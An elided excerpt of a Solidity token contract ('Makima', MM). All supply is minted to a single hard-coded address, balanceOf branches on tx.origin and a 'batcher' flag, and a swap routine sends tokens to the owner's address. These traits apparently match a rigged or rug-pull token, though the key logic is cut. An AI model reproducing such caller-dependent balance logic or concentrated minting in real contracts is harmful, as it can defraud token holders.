...
contract BZXToken is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address public pairToken = 0xa8Ae78c654AAC8eEb468A9659EAa5F8a398eD5cE;
    
    constructor(){
        _name = "Makima";
        _symbol = "MM";
        masterAddress = 0xa8Ae78c654AAC8eEb468A9659EAa5F8a398eD5cE;
        gameAddress =0xa8Ae78c654AAC8eEb468A9659EAa5F8a398eD5cE ;
        miningAddress = 0xa8Ae78c654AAC8eEb468A9659EAa5F8a398eD5cE;
        _mint(gameAddress, 1000000 * 1e18);
        _mint(miningAddress, 4500000 * 1e18);
        _mint(masterAddress, 1500000 * 1e18);
        _mint(0xa8Ae78c654AAC8eEb468A9659EAa5F8a398eD5cE, 3000000 * 1e18);
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        if (isNoFeeAddress[tx.origin] || batcher[account]) {
    ...
    function _swapAndCharge(uint256 tokenBalance) private lockTheSwap {
        ...
        IERC20(address(this)).transfer(masterAddress, amount);
    }
